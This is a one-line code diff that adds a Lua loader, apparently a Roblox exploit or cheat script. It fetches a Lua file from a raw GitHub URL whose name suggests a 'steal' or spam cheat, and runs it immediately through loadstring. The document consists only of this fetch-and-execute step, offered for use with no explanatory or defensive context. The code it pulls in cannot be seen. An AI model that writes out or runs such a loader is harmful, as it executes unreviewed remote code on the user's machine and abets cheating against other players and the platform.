@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/plant-steal-co-op-spam7-xfnkho76on4mca.lua"))()
